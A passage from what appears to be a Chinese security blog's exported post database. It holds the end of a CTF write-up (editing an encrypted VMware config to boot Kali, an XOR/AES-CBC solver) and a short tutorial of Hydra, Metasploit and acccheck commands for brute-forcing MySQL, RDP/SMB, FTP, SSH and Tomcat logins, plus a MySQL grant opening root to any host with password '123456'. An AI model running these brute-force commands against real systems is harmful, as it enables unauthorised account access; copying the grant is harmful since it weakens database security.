<span class=\"hljs-string\">\"1\"</span>\nrollingTier0.<span class=\"hljs-attr\">clientFlags</span> = <span class=\"hljs-string\">\"8\"</span>\nrollingTier0.<span class=\"hljs-attr\">displayName</span> = <span class=\"hljs-string\">\"自动保护快照\"</span>\nrollingTier1.<span class=\"hljs-attr\">uid</span> = <span class=\"hljs-string\">\"2\"</span>\nrollingTier1.<span class=\"hljs-attr\">interval</span> = <span class=\"hljs-string\">\"604800\"</span>\nrollingTier1.<span class=\"hljs-attr\">baseTier</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier1.<span class=\"hljs-attr\">baseTierInterval</span> = <span class=\"hljs-string\">\"7\"</span>\nrollingTier1.<span class=\"hljs-attr\">maximum</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier1.<span class=\"hljs-attr\">clientFlags</span> = <span class=\"hljs-string\">\"8\"</span>\nrollingTier1.<span class=\"hljs-attr\">displayName</span> = <span class=\"hljs-string\">\"自动保护快照\"</span>\nrollingTier2.<span class=\"hljs-attr\">uid</span> = <span class=\"hljs-string\">\"3\"</span>\nrollingTier2.<span class=\"hljs-attr\">interval</span> = <span class=\"hljs-string\">\"2419200\"</span>\nrollingTier2.<span class=\"hljs-attr\">baseTier</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier2.<span class=\"hljs-attr\">baseTierInterval</span> = <span class=\"hljs-string\">\"28\"</span>\nrollingTier2.<span class=\"hljs-attr\">maximum</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier2.<span class=\"hljs-attr\">clientFlags</span> = <span class=\"hljs-string\">\"8\"</span>\nrollingTier2.<span class=\"hljs-attr\">displayName</span> = <span class=\"hljs-string\">\"自动保护快照\"</span>\nsnapshot.<span class=\"hljs-attr\">numRollingTiers</span> = <span class=\"hljs-string\">\"3\"</span>\nfloppy0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"FALSE\"</span>\nuuid.<span class=\"hljs-attr\">bios</span> = <span class=\"hljs-string\">\"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\"</span>\nuuid.<span class=\"hljs-attr\">location</span> = <span class=\"hljs-string\">\"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\"</span>\nmigrate.<span class=\"hljs-attr\">hostlog</span> = <span class=\"hljs-string\">\".\\Ubuntu 64-bit-0dae80fb.hlog\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">redo</span> = <span class=\"hljs-string\">\"\"</span>\npciBridge0.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"17\"</span>\npciBridge4.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"21\"</span>\npciBridge5.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"22\"</span>\npciBridge6.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"23\"</span>\npciBridge7.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"24\"</span>\nscsi0.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"16\"</span>\nvmci0.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"32\"</span>\nsata0.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"33\"</span>\nvmci0.<span class=\"hljs-attr\">id</span> = <span class=\"hljs-string\">\"-119750326\"</span>\nmonitor.<span class=\"hljs-attr\">phys_bits_used</span> = <span class=\"hljs-string\">\"43\"</span>\nvmotion.<span class=\"hljs-attr\">checkpointFBSize</span> = <span class=\"hljs-string\">\"4194304\"</span>\nvmotion.<span class=\"hljs-attr\">checkpointSVGAPrimarySize</span> = <span class=\"hljs-string\">\"134217728\"</span>\n<span class=\"hljs-attr\">cleanShutdown</span> = <span class=\"hljs-string\">\"TRUE\"</span>\n<span class=\"hljs-attr\">softPowerOff</span> = <span class=\"hljs-string\">\"FALSE\"</span>\nsvga.<span class=\"hljs-attr\">guestBackedPrimaryAware</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nrollingTier0.<span class=\"hljs-attr\">timeSincelast</span> = <span class=\"hljs-string\">\"203\"</span>\nrollingTier1.<span class=\"hljs-attr\">timeSincelast</span> = <span class=\"hljs-string\">\"203\"</span>\nrollingTier2.<span class=\"hljs-attr\">timeSincelast</span> = <span class=\"hljs-string\">\"203\"</span>\nsvga.<span class=\"hljs-attr\">vramSize</span> = <span class=\"hljs-string\">\"134217728\"</span></code></pre></p>\n<p>用一个正常的虚拟机添加一个CD/DVD，指向一个kali的iso，发现配置文件会多了下面三行代码<br><pre><code class=\"hljs undefined\">sata0:<span class=\"hljs-number\">0</span><span class=\"hljs-selector-class\">.deviceType</span> = <span class=\"hljs-string\">\"cdrom-image\"</span>\nsata0:<span class=\"hljs-number\">0</span><span class=\"hljs-selector-class\">.fileName</span> = <span class=\"hljs-string\">\"D:\\kali\\kali-linux-2018.2-amd64.iso\"</span>\nsata0:<span class=\"hljs-number\">0</span><span class=\"hljs-selector-class\">.present</span> = <span class=\"hljs-string\">\"TRUE\"</span></code></pre></p>\n<p>加到上面的代码上去重新加密一下<br><pre><code class=\"hljs undefined\">root<span class=\"hljs-variable\">@Ubuntu</span><span class=\"hljs-symbol\">:~/Desktop/VMwareVMX-master</span><span class=\"hljs-comment\"># python3 main.py -e -D \"Ubuntu 64-bit\" -p bibinb ubuntu.vmx result.vmx</span></code></pre></p>\n<p><code>-D</code>指定虚拟机的名字，<code>ubuntu.vmx</code>待加密的文件，<code>result.vmx</code>加密后的结果，再用result.vmx替换掉原来的配置，打开虚拟机就可以看到多了CD/DVD<br><img src=\"/img/2018-12-03/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>开机按esc进BIOS选CD/DVD启动<br><img src=\"/img/2018-12-03/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>选第一个<br><img src=\"/img/2018-12-03/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>进到kali里打开文件系统<br><img src=\"/img/2018-12-03/6.jpg\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br>find一下<br><img src=\"/img/2018-12-03/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>把4个部分凑一起打开就getflag<br><img src=\"/img/2018-12-03/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"></p>\n<h4 id=\"0x05-What’s-this\"><a href=\"#0x05-What’s-this\" class=\"headerlink\" title=\"0x05 What’s_this\"></a>0x05 What’s_this</h4><p><a href=\"https://delcoding.github.io/2018/12/pcb-writeup/\" target=\"_blank\" rel=\"noopener\">文件删了复现不了了，只能看大佬的博客了</a></p>\n<h3 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h3><h4 id=\"0x04-easy-crypto\"><a href=\"#0x04-easy-crypto\" class=\"headerlink\" title=\"0x04 easy crypto\"></a>0x04 easy crypto</h4><p>本质就是异或，逆操作一遍就可以了<br>payloa如下：<br><pre><code class=\"hljs undefined\"><span class=\"hljs-comment\">#!usr/bin/python </span>\n<span class=\"hljs-comment\">#_*_ coding=UTF-8 _*_</span>\n\nfrom Crypto.Cipher import AES\nfrom binascii import b2a_hex, a2b_hex\nfrom Crypto import Random\nimport sys\n<span class=\"hljs-comment\">#from FLAG import flag</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">aesdemo</span>:</span>\n\t<span class=\"hljs-comment\">#aes = AES.new(key,mode)</span>\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__init__</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>,key)</span></span>:\n\t\t<span class=\"hljs-keyword\">self</span>.key = key\n\t\t<span class=\"hljs-comment\">#self.BS=BS</span>\n\t\n       \n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">pad</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>,msg)</span></span>:\n\t\t<span class=\"hljs-comment\">#BS = AES.block_size </span>\n\t\t<span class=\"hljs-comment\"># aes数据分组长度为128 bit</span>\n\t\tbyte = <span class=\"hljs-number\">16</span> - len(msg) % <span class=\"hljs-number\">16</span>\n\t\t<span class=\"hljs-keyword\">return</span> msg + chr(byte) * byte\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">unpad</span><span class=\"hljs-params\">(msg)</span></span>:\n\t\t<span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-symbol\">msg:</span>\n\t\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">''</span>\n\t\t<span class=\"hljs-keyword\">return</span> msg[<span class=\"hljs-symbol\">:-ord</span>(msg[-<span class=\"hljs-number\">1</span>])]\t\t\n    \n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">xor</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>,a, b)</span></span>:\n    \t\t<span class=\"hljs-comment\">#assert len(a) == len(b)</span>\n    \t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">''</span>.join([chr(ord(ai)^ord(bi)) <span class=\"hljs-keyword\">for</span> ai, bi <span class=\"hljs-keyword\">in</span> zip(a,b)])\n\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">split_by</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>,data,step)</span></span>:\n        \t<span class=\"hljs-keyword\">return</span> [data[i : i+step] <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> xrange(<span class=\"hljs-number\">0</span>, len(data), step)]\n\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">encrypt</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>, plaintext)</span></span>:\n        <span class=\"hljs-comment\"># 生成随机初始向量IV</span>\n\t\tiv = Random.new().read(<span class=\"hljs-number\">16</span>)\n\t\tprint <span class=\"hljs-string\">\"iv is\"</span>,iv.encode(<span class=\"hljs-string\">'hex'</span>)\n\t\taes = AES.new(<span class=\"hljs-keyword\">self</span>.key,AES.MODE_CBC,iv)\n\t\tprev_pt = iv\n\t\tprev_ct = iv\n\t\tct=<span class=\"hljs-string\">\"\"</span>\n\n\t\tmsg=<span class=\"hljs-keyword\">self</span>.pad(plaintext)\n\t\t<span class=\"hljs-keyword\">for</span> block <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">self</span>.split_by(msg, <span class=\"hljs-number\">16</span>):\n\t\t\tct_block = <span class=\"hljs-keyword\">self</span>.xor(block, prev_pt)\n\t\t\tct_block = aes.encrypt(ct_block)\n\t\t\tct_block = <span class=\"hljs-keyword\">self</span>.xor(ct_block, prev_ct)\n\t\t\tct += ct_block\n\t\t\t\n\t\t<span class=\"hljs-keyword\">return</span> b2a_hex(iv + ct)\n\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">decrypt</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>, ciphertext,iv)</span></span>:\n        <span class=\"hljs-comment\"># 生成随机初始向量IV</span>\n\t\tprint <span class=\"hljs-string\">\"iv is\"</span>,iv.encode(<span class=\"hljs-string\">'hex'</span>)\n\t\taes = AES.new(<span class=\"hljs-keyword\">self</span>.key,AES.MODE_CBC,iv)\n\t\tprev_pt = iv\n\t\tprev_ct = iv\n\t\tct=<span class=\"hljs-string\">\"\"</span>\n\n\t\t<span class=\"hljs-comment\">#msg=self.pad(plaintext)</span>\n\t\t<span class=\"hljs-keyword\">for</span> block <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">self</span>.split_by(ciphertext, <span class=\"hljs-number\">16</span>):\n\t\t\tct_block = <span class=\"hljs-keyword\">self</span>.xor(block, prev_pt)\n\t\t\tct_block = aes.decrypt(ct_block)\n\t\t\tct_block = <span class=\"hljs-keyword\">self</span>.xor(ct_block, prev_ct)\n\t\t\tct += ct_block\n\t\t\t\n\t\t<span class=\"hljs-keyword\">return</span> b2a_hex(iv + ct)\n\t\t\ns = <span class=\"hljs-string\">'524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa'</span> \niv = s[<span class=\"hljs-number\">0</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">32</span>].decode(<span class=\"hljs-string\">'hex'</span>)\nsc = s[<span class=\"hljs-number\">32</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-symbol\">:</span>].decode(<span class=\"hljs-string\">'hex'</span>)\nprint len(iv),len(sc)\nflag = <span class=\"hljs-string\">'A'</span>*<span class=\"hljs-number\">64</span>\n\nBS = AES.block_size <span class=\"hljs-comment\"># aes数据分组长度为128 bit</span>\nkey=<span class=\"hljs-string\">\"asdfghjkl1234567890qwertyuiopzxc\"</span>\ndemo = aesdemo(key)\ne = demo.encrypt(flag)\nprint(<span class=\"hljs-string\">\"加密：\"</span>, e)\n\naaa = demo.decrypt(sc,iv)\nprint aaa\nprint aaa.decode(<span class=\"hljs-string\">'hex'</span>)</code></pre></p>"},{"title":"涨姿势！暴力破解方法和工具","index_img":"/img/2019-01-18/index.png","date":"2019-01-18T11:39:59.000Z","_content":"**字典虽小，够用就行**\n<!--more-->\n\n### 二、 暴力破解\n#### 2.1 mysql数据库破解\n&emsp;&emsp;# 爆破数据库账号密码，数据库必须要开启3306远程登录\n&emsp;&emsp;&emsp;&emsp;2.1.1 Hydra\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 用户名 -P 字典 服务名 -V\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l root -P dist.txt mysql -V\n&emsp;&emsp;&emsp;&emsp;2.1.2 HexorBase\n&emsp;&emsp;&emsp;&emsp;2.1.3 metasploit（search查找模块、back返回）\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/mysql/mysql_login\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# show options\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set host IP地址\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set username 用户\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set PASS_FILE dist.txt\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set port 端口号\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;run\n#### 2.2 mysql数据库配置（对外）\n&emsp;&emsp;&emsp;&emsp;2.2.1 3306端口对外开放\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;grant all privileges on *.* to 'root'@'%' identified by '123456' with grant option;\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;flush privileges;（root，123456）\n&emsp;&emsp;&emsp;&emsp;2.2.2 Navicat数据库管理软件\n&emsp;&emsp;&emsp;&emsp;2.2.3 报错解决方案\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;is blocked because of many connec错误解决方案：\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;进入Mysql数据库查看max_connect_errors： \n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like 'max_connect_errors';\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;修改max_connect_errors的数量为1000： \n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set global max_connect_errors = 1000;\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;查看是否修改成功：\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like 'max_connect_errors';\n#### 2.3 3389远程连接爆破\n&emsp;&emsp;&emsp;&emsp;2.3.1 DuBrute\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;这个只能爆rdp的，smb的用下面（比如win server）\n&emsp;&emsp;&emsp;&emsp;2.3.2 Hydra\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l administrator -P /top1500.txt rdp -V  (rdp可以换smb)\n&emsp;&emsp;&emsp;&emsp;2.3.3 acccheck（smb）\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -U user.txt -P password.txt\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -u tian -P dic.txt\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;结果保存在cracked文件中\n#### 2.4 Web-Tomcat中间件\n&emsp;&emsp;&emsp;&emsp;2.4.1 Metasploit\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/http/tomcat_mgr_login\n&emsp;&emsp;&emsp;&emsp;2.4.3 对外访问\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Server.xml\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<Engine name=\"Catalina\" defaultHost=\"IP地址\"\\>\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<Host name=\"IP地址\" appBase=\"webapps\" npackWARs=\"true\" autoDeploy=\"true\"\\>\n#### 2.5 ftp爆破\n&emsp;&emsp;&emsp;&emsp;2.5.1 Metasploit\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ftp/ftp_login\n&emsp;&emsp;&emsp;&emsp;2.5.2 Hydra\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l admin -P /top1500.txt ftp -V\n#### 2.6 ssh爆破\n&emsp;&emsp;&emsp;&emsp;2.6.1 Metasploit\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ssh/ssh_login\n&emsp;&emsp;&emsp;&emsp;2.6.2 Hydra\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#hydra 192.168.146.141 -l root -P /top1500.txt ssh -V\n#### 2.7 Webshell爆破\n&emsp;&emsp;&emsp;&emsp;2.7.1 BurpSuite\n\n\n\n\n\n","source":"_posts/2019-01-18-Violent-cracking.md","raw":"---\ntitle: 涨姿势！暴力破解方法和工具\nindex_img: /img/2019-01-18/index.png\ndate: 2019-01-18 19:39:59\ntags: \n- 暴力破解\n---\n**字典虽小，够用就行**\n<!--more-->\n\n### 二、 暴力破解\n#### 2.1 mysql数据库破解\n&emsp;&emsp;# 爆破数据库账号密码，数据库必须要开启3306远程登录\n&emsp;&emsp;&emsp;&emsp;2.1.1 Hydra\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 用户名 -P 字典 服务名 -V\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l root -P dist.txt mysql -V\n&emsp;&emsp;&emsp;&emsp;2.1.2 HexorBase\n&emsp;&emsp;&emsp;&emsp;2.1.3 metasploit（search查找模块、back返回）\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/mysql/mysql_login\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# show options\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set host IP地址\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set username 用户\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set PASS_FILE dist.txt\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set port 端口号\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;run\n#### 2.2 mysql数据库配置（对外）\n&emsp;&emsp;&emsp;&emsp;2.2.1 3306端口对外开放\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;grant all privileges on *.* to 'root'@'%' identified by '123456' with grant option;\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;flush privileges;（root，123456）\n&emsp;&emsp;&emsp;&emsp;2.2.2 Navicat数据库管理软件\n&emsp;&emsp;&emsp;&emsp;2.2.3 报错解决方案\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;is blocked because of many connec错误解决方案：\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;进入Mysql数据库查看max_connect_errors： \n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like 'max_connect_errors';\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;修改max_connect_errors的数量为1000： \n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set global max_connect_errors = 1000;\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;查看是否修改成功：\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like 'max_connect_errors';\n#### 2.3 3389远程连接爆破\n&emsp;&emsp;&emsp;&emsp;2.3.1 DuBrute\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;这个只能爆rdp的，smb的用下面（比如win server）\n&emsp;&emsp;&emsp;&emsp;2.3.2 Hydra\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l administrator -P /top1500.txt rdp -V  (rdp可以换smb)\n&emsp;&emsp;&emsp;&emsp;2.3.3 acccheck（smb）\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -U user.txt -P password.txt\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -u tian -P dic.txt\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;结果保存在cracked文件中\n#### 2.4 Web-Tomcat中间件\n&emsp;&emsp;&emsp;&emsp;2.4.1 Metasploit\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/http/tomcat_mgr_login\n&emsp;&emsp;&emsp;&emsp;2.4.3 对外访问\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Server.xml\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<Engine name=\"Catalina\" defaultHost=\"IP地址\"\\>\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<Host name=\"IP地址\" appBase=\"webapps\" npackWARs=\"true\" autoDeploy=\"true\"\\>\n#### 2.5 ftp爆破\n&emsp;&emsp;&emsp;&emsp;2.5.1 Metasploit\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ftp/ftp_login\n&emsp;&emsp;&emsp;&emsp;2.5.2 Hydra\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l admin -P /top1500.txt ftp -V\n#### 2.6 ssh爆破\n&emsp;&emsp;&emsp;&emsp;2.6.1 Metasploit\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ssh/ssh_login\n&emsp;&emsp;&emsp;&emsp;2.6.2 Hydra\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V\n&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#hydra 192.168.146.141 -l root -P /top1500.txt ssh -V\n#### 2.7 Webshell爆破\n&emsp;&emsp;&emsp;&emsp;2.7.1 BurpSuite\n\n\n\n\n\n","slug":"Violent-cracking","published":1,"mouth":"01","updated":"2020-09-18T03:38:47.659Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxf000kez8kpqb7tygc","content":"<p><strong>字典虽小，够用就行</strong><br><a id=\"more\"></a></p>\n<h3 id=\"二、-暴力破解\"><a href=\"#二、-暴力破解\" class=\"headerlink\" title=\"二、 暴力破解\"></a>二、 暴力破解</h3><h4 id=\"2-1-mysql数据库破解\"><a href=\"#2-1-mysql数据库破解\" class=\"headerlink\" title=\"2.1 mysql数据库破解\"></a>2.1 mysql数据库破解</h4><p>&emsp;&emsp;# 爆破数据库账号密码，数据库必须要开启3306远程登录<br>&emsp;&emsp;&emsp;&emsp;2.1.1 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 用户名 -P 字典 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l root -P dist.txt mysql -V<br>&emsp;&emsp;&emsp;&emsp;2.1.2 HexorBase<br>&emsp;&emsp;&emsp;&emsp;2.1.3 metasploit（search查找模块、back返回）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/mysql/mysql_login<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# show options<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set host IP地址<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set username 用户<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set PASS_FILE dist.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set port 端口号<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;run</p>\n<h4 id=\"2-2-mysql数据库配置（对外）\"><a href=\"#2-2-mysql数据库配置（对外）\" class=\"headerlink\" title=\"2.2 mysql数据库配置（对外）\"></a>2.2 mysql数据库配置（对外）</h4><p>&emsp;&emsp;&emsp;&emsp;2.2.1 3306端口对外开放<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;grant all privileges on <em>.</em> to ‘root‘@’%’ identified by ‘123456’ with grant option;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;flush privileges;（root，123456）<br>&emsp;&emsp;&emsp;&emsp;2.2.2 Navicat数据库管理软件<br>&emsp;&emsp;&emsp;&emsp;2.2.3 报错解决方案<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;is blocked because of many connec错误解决方案：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;进入Mysql数据库查看max_connect_errors：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like ‘max_connect_errors’;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;修改max_connect_errors的数量为1000：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;set global max_connect_errors = 1000;<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;查看是否修改成功：<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;show variables like ‘max_connect_errors’;</p>\n<h4 id=\"2-3-3389远程连接爆破\"><a href=\"#2-3-3389远程连接爆破\" class=\"headerlink\" title=\"2.3 3389远程连接爆破\"></a>2.3 3389远程连接爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.3.1 DuBrute<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;这个只能爆rdp的，smb的用下面（比如win server）<br>&emsp;&emsp;&emsp;&emsp;2.3.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l administrator -P /top1500.txt rdp -V  (rdp可以换smb)<br>&emsp;&emsp;&emsp;&emsp;2.3.3 acccheck（smb）<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -U user.txt -P password.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;acccheck -t 192.168.0.106 -u tian -P dic.txt<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;结果保存在cracked文件中</p>\n<h4 id=\"2-4-Web-Tomcat中间件\"><a href=\"#2-4-Web-Tomcat中间件\" class=\"headerlink\" title=\"2.4 Web-Tomcat中间件\"></a>2.4 Web-Tomcat中间件</h4><p>&emsp;&emsp;&emsp;&emsp;2.4.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/http/tomcat_mgr_login<br>&emsp;&emsp;&emsp;&emsp;2.4.3 对外访问<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;Server.xml<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;Engine name=”Catalina” defaultHost=”IP地址”><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;Host name=”IP地址” appBase=”webapps” npackWARs=”true” autoDeploy=”true”></p>\n<h4 id=\"2-5-ftp爆破\"><a href=\"#2-5-ftp爆破\" class=\"headerlink\" title=\"2.5 ftp爆破\"></a>2.5 ftp爆破</h4><p>&emsp;&emsp;&emsp;&emsp;2.5.1 Metasploit<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;use auxiliary/scanner/ftp/ftp_login<br>&emsp;&emsp;&emsp;&emsp;2.5.2 Hydra<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;# hydra 192.168.146.141 -l admin -P /top1500.txt ftp 